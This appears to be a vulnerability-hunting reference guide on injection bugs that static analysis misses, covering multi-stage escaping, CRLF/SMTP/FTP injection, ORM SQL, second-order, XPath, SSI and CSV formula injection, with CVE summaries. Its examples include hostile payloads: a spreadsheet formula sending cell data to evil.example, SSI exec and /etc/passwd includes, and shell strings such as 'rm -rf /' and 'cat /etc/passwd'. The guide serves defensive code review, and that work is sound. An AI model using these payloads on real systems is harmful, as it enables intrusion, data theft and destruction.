---
description: Semantic context escaping, multi-stage sanitization failures, protocol injection
skill: code-vulnerability-analysis, code-variant-analysis
languages: C/C++, Python, JS
---

# Injection — Semantic Context Escaping

> Target: Injection bugs that survive SAST because the injection vector requires understanding
> the semantic context where data is consumed — not just whether "user data reaches a sink."
> These involve multi-stage escaping errors, protocol-level injection, second-order data flows,
> and ORM constructs that look safe but interpolate.

---

## What You're Hunting (LLM-Advantage Patterns)

### 1. Multi-Stage Escaping Composition Errors

Each escaping stage is individually correct, but the composition is wrong because
the decode order at the consumer reverses the encode order.

```
Producer: HTML-escape(URL-encode(data))
  "a&b" → "a%26b" → "a%26b" (HTML-escape doesn't change %26)

Consumer: HTML-decode then URL-decode
  "a%26b" → "a%26b" → "a&b" ← correct

But if producer: URL-encode(HTML-escape(data))
  "a&b" → "a&amp;b" → "a%26amp%3Bb"

Consumer: HTML-decode then URL-decode
  "a%26amp%3Bb" → "a%26amp%3Bb" → "a&amp;b" ← wrong, leftover HTML entity
```

The subtle case: escaping is correct for context X but data is used in context Y.
HTML-escaped data used in a JavaScript string literal context. SQL-escaped data used
in a LIKE clause (where `%` and `_` have special meaning and are not escaped by SQL
string escaping).

### 2. Protocol-Level Injection

#### HTTP Header Injection (CRLF)
User data flows into an HTTP header value. If `\r\n` is not filtered, the attacker
injects additional headers or terminates the headers to inject a response body.

```c
// Function A: build header
void add_custom_header(req_t *req, const char *name, const char *value) {
    strbuf_addf(&req->headers, "%s: %s\r\n", name, value);
}
// If value contains \r\n, attacker injects headers.
// Function A validates name but not value.
```

**In cURL**: The `CURLOPT_HTTPHEADER` option passes user-provided headers. cURL
validates to some extent, but edge cases in header folding, continuation lines,
and encoding can bypass the validation.

**In wget**: HTTP request construction from URL components and user-provided headers.

#### SMTP Command Injection
Email addresses or message content injected into SMTP dialogue:
```
MAIL FROM:<user@attacker.example>\r\nDATA\r\n
```

#### FTP Command Injection
In FTP URLs, the path component can contain `%0d%0a` which, after URL decoding,
becomes `\r\n` — injecting FTP commands into the control channel.

### 3. Command Construction Across Functions

Each function adds a fragment to a shell command. Each fragment is individually
sanitized, but the sanitization is wrong for the final context.

```c
// Function A: build base command
void init_cmd(strbuf *cmd, const char *program) {
    strbuf_addf(cmd, "%s", program);  // program from config, trusted
}

// Function B: add argument
void add_arg(strbuf *cmd, const char *arg) {
    strbuf_addf(cmd, " %s", shell_escape(arg));  // escapes quotes and backslashes
}

// Function C: execute
void run(strbuf *cmd) {
    system(cmd->buf);
}

// The bug: shell_escape handles ' and \ but not $(...) or `...` or ;
// Or: shell_escape is correct for sh but the system runs cmd via bash
// which has additional metacharacters.
```

### 4. SQL Injection via ORM Constructs

The ORM query builder looks safe but actually interpolates in certain methods:

```python
# Looks safe (parameterized):
User.objects.filter(name=user_input)

# Unsafe: raw SQL in .extra() or .raw()
User.objects.extra(where=[f"name = '{user_input}'"])  # injection!

# Unsafe: order_by with user input
User.objects.order_by(user_input)  # if user_input is "-password", sorts by password
# But worse: some ORMs allow SQL in order_by: "name; DROP TABLE users--"
```

```javascript
// Sequelize — looks safe:
User.findAll({ where: { name: userInput } });

// Unsafe with Op.col or literal:
User.findAll({ where: sequelize.literal(`name = '${userInput}'`) });

// Unsafe with $-prefixed operators in older Sequelize:
User.findAll({ where: { name: { $ne: null } } });  // NoSQL-style injection
```

### 5. Second-Order Injection

Data is stored safely (properly escaped for the storage context), then retrieved and
used unsafely in a different context.

```
Step 1: User registers with username "admin'--"
        INSERT INTO users (name) VALUES ('admin''--')  ← properly escaped

Step 2: Admin panel builds query using stored username
        query = "SELECT * FROM logs WHERE user = '" + stored_name + "'"
        ← stored_name is "admin'--", causes injection
```

The storage was safe. The retrieval was safe. The re-use in a new SQL context is
where injection occurs. SAST tools that track taint from input to sink miss this
because the taint is "laundered" through the database.

**In git**: Config values stored in `.gitconfig` are trusted when read back, but
may contain shell metacharacters if a git hook uses them in a shell command.

### 6. XPath Injection

The XML equivalent of SQL injection: a query is built by string concatenation
against an XPath expression evaluator instead of being parameterized.

```java
// Java (javax.xml.xpath) — string-concatenated XPath query
String expr = "//user[username/text()='" + username +
              "' and password/text()='" + password + "']";
XPathExpression xpe = xpath.compile(expr);
Node match = (Node) xpe.evaluate(doc, XPathConstants.NODE);
// username = "' or '1'='1" bypasses the credential check entirely —
// same boolean-injection shape as SQL injection, but against XML data.
```

```python
# Python (lxml) — same concatenation pattern
result = tree.xpath(f"//account[@id='{account_id}']")
# account_id = "' or '1'='1" returns every account node.
```

SAST tools tuned for SQL injection sinks frequently do not recognize `xpath.compile`,
`tree.xpath`, or `.NET`'s `XPathExpression` as injection sinks at all — the query
language is different even though the concatenation bug is identical.

### 7. SSI (Server-Side Includes) Injection

Unsanitized input reaches a response that the web server parses for SSI directives
(files served as `.shtml`, `.shtm`, `.stm`, or any path where `mod_include`/SSI
processing is enabled). The directive syntax `<!--#exec cmd="..."-->` is not a template
language most SAST rules watch for, so injected user data that later gets written into
an `.shtml`-served file (a comment field, a logged referrer, a stored username) is missed.

```
<!--#exec cmd="id" -->                     ← command execution
<!--#include virtual="/etc/passwd" -->     ← arbitrary file inclusion
<!--#set var="x" value="$QUERY_STRING" --> ← reflects raw query string
```

```python
# Flask app writes an unsanitized comment into a page later served as .shtml
# by the front-end web server (e.g. Apache with mod_include enabled)
def save_comment(request):
    comment = request.form["comment"]           # attacker-controlled
    with open("comments/latest.shtml", "a") as f:
        f.write(f"<p>{comment}</p>\n")
    # If comment contains `<!--#exec cmd="whoami" -->` and the web server (not
    # the app) is configured to parse .shtml for SSI, the directive executes
    # server-side the next time the page is rendered — a sink outside the app's
    # own template engine that most taint trackers never model.
```

Check the web-server config (Apache `Options +Includes`, `AddType`/`AddHandler
server-parsed .shtml`) alongside the code — the vulnerability only exists if SSI
processing is enabled for the path the tainted data reaches.

### 8. CSV / Formula Injection

An untrusted value is written into a cell of a CSV (or XLSX) file that is later opened
in a spreadsheet application, without neutralizing a leading `=`, `+`, `-`, or `@` —
each of which spreadsheet software interprets as the start of a formula.

```python
# Export handler writes user-supplied fields directly into CSV cells
def export_users_csv(users):
    writer = csv.writer(response)
    for u in users:
        writer.writerow([u.name, u.email, u.notes])
        # u.notes = '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")'
        # Opened in Excel/Sheets, this becomes a live formula that can
        # exfiltrate adjacent cell data or trigger DDE/macro execution
        # depending on the spreadsheet application's settings.
```

The fix is not HTML- or SQL-escaping (this is not a web-context sink) — it requires
prefixing values that begin with `=`, `+`, `-`, `@`, tab, or carriage return with a
neutralizing character (e.g. a leading `'` or space) before they are written into an
exported CSV/XLSX cell. Grep CSV/XLSX export code paths (`csv.writer`, `openpyxl`,
`xlsxwriter`, `ExcelJS`) for user-controlled fields written without this neutralization.

---

## C/C++ Specific Patterns

### system(), popen(), exec Family
- `system()` and `popen()` invoke `/bin/sh -c` — full shell interpretation
- `execvp()` with user-controlled first argument: PATH-based binary injection
- `execlp()` with arguments constructed from user data: argument injection
- Even `execve()` can be vulnerable if environment variables are attacker-controlled

### snprintf to Command Buffer
```c
char cmd[1024];
snprintf(cmd, sizeof(cmd), "git clone '%s'", url);
system(cmd);  // single quotes don't protect against url containing '; cmd'
```

Single quotes protect against most shell metacharacters but NOT against the single
quote itself. If `url` is `'; rm -rf /; '`, the command becomes:
`git clone ''; rm -rf /; ''`

### Protocol Implementation Injection
C programs that implement protocols (HTTP, FTP, SMTP, DNS) must ensure that
user-supplied data in protocol fields doesn't contain protocol control characters.
Each protocol has different control characters (`\r\n` for HTTP/SMTP/FTP, null bytes
for DNS, `;` for HTTP cookies).

---

## Python Specific Patterns

### subprocess with shell=True
```python
subprocess.run(f"grep {user_input} /var/log/app.log", shell=True)
# user_input = "; cat /etc/passwd"
```

Even `shlex.quote()` has had bypass issues in edge cases. The safe pattern is
`subprocess.run(["grep", user_input, "/var/log/app.log"])` — list form, no shell.

### eval/exec Chains
```python
# Direct eval is caught by SAST. But:
expr = compile(user_input, '<string>', 'eval')  # compile is not flagged
result = eval(expr)  # eval of compiled code — sometimes missed

# Or via operator module:
import operator
ops = {'+': operator.add, '-': operator.sub}
op = ops.get(user_input)  # safe IF user_input is validated
# But if the dict lookup is on a broader set of attributes...
```

### pickle.loads / YAML unsafe_load
```python
# Data from network/file/database:
obj = pickle.loads(untrusted_bytes)  # arbitrary code execution
config = yaml.load(untrusted_yaml, Loader=yaml.UnsafeLoader)  # arbitrary Python objects
# FullLoader had bypass CVEs pre-PyYAML 5.4 (CVE-2020-1747); prefer SafeLoader
```

SAST catches `pickle.loads(request.data)` but may miss `pickle.loads(cache.get(key))`
where the cache is Redis and the attacker poisoned the cache entry.

---

## JavaScript Specific Patterns

### eval() and Function() Variants
```javascript
eval(userInput);          // caught by SAST
new Function(userInput);  // sometimes missed
setTimeout(userInput, 0); // string form executes as code — often missed
setInterval(userInput, 1000);  // same issue
```

### child_process.exec with Template Strings
```javascript
const { exec } = require('child_process');
exec(`git log --author="${userInput}"`);  // injection via quote escape
// Even with attempted escaping:
exec(`git log --author="${userInput.replace(/"/g, '\\"')}"`);
// Bypassed by: $(command) or `command` — not caught by quote replacement
```

### Prototype Pollution to Code Execution
```javascript
// If attacker can set Object.prototype properties:
Object.prototype.shell = '/bin/sh';
Object.prototype.env = { NODE_OPTIONS: '--require=./malicious.js' };
// Then child_process.spawn inherits these defaults
```

Prototype pollution itself is a known issue, but the code execution chains that
follow it are complex and span multiple modules. The pollution happens in one
library (lodash.merge, deep-extend), and the exploitation happens in a completely
different library (child_process, handlebars, pug).

---

## Detection Questions

1. **"In what context is this data consumed, and was it escaped for THAT context?"**
   Data escaped for SQL may not be safe in a shell. Data escaped for HTML may not
   be safe in a JavaScript string. Identify the consumption context, not just the
   nearest escaping function.

2. **"Can protocol control characters survive through the data path?"**
   For each protocol boundary the data crosses (HTTP, SMTP, FTP, DNS), check whether
   the relevant control characters (`\r\n`, null, `;`, etc.) are stripped or escaped.

3. **"Is stored data re-used in a different context than it was stored for?"**
   Trace data from storage back to input and forward to all uses. If it was escaped
   for context A (SQL storage) but used in context B (shell command), the escaping
   is insufficient.

4. **"Does the ORM/query builder actually parameterize this specific method?"**
   Not all ORM methods are parameterized. `.raw()`, `.extra()`, `.literal()`,
   `.order_by()`, and annotation/aggregation with string expressions may interpolate.

5. **"Are all shell metacharacters handled, or just quotes?"**
   Enumerate: `; | & $ `` ( ) { } < > \n \r ! # ~ *  ? [ ]`. Many custom escaping
   functions handle only `'` and `"`.

6. **"Are XPath/XQuery expressions built by string concatenation instead of a
   parameterized/compiled variable binding?"** Same shape as SQL injection, different
   query language — check `xpath.compile`, `tree.xpath`, and equivalent APIs for
   f-strings or `+` concatenation of untrusted input.

7. **"Does any tainted data reach a file served under `.shtml`/`.shtm`/`.stm`, and is
   SSI processing enabled for that path?"** Check both the code (where the file gets
   written) and the web-server config (`Options +Includes`, `AddHandler server-parsed`)
   — the sink only exists if both conditions hold.

8. **"Does an exported CSV/XLSX cell contain an untrusted value that isn't neutralized
   against a leading `=`, `+`, `-`, `@`, tab, or CR?"** Check every export path
   (`csv.writer`, `openpyxl`, `xlsxwriter`, `ExcelJS`) for user-controlled fields
   written raw into a cell.

---

## Real CVE Examples

### CVE-2023-27533 (cURL — TELNET option injection)
cURL's TELNET handler allowed users to set TELNET options via the URL. These options
were passed to the TELNET negotiation without sufficient sanitization. An attacker
could inject TELNET protocol commands by embedding control characters in the option
values. The option parsing was in one function, the protocol negotiation in another,
and the sanitization was appropriate for URL context but not for TELNET protocol context.

### CVE-2021-21300 (git — command injection via pathname)
On case-insensitive filesystems, git's clean/smudge filter mechanism could be tricked
into executing commands. A specially crafted repository with a `.gitattributes` file
could specify a filter command that referenced a path within the repository. The filter
name was validated as a config key but used as a command argument. The injection
crossed the boundary between config parsing (safe for that context) and command
execution (not safe for that context).

### CVE-2016-4971 (wget — arbitrary file write via FTP redirect)
wget followed HTTP-to-FTP redirects. When the FTP server provided a filename in the
response, wget used that filename for local file creation. An attacker's FTP server
could return a filename like `.bash_profile`, causing wget to overwrite arbitrary
files. The redirect handling in one module trusted the filename from the FTP module,
which had no filename sanitization because FTP filenames are normally trusted from
the original URL the user provided — but the redirect changed the trust boundary.
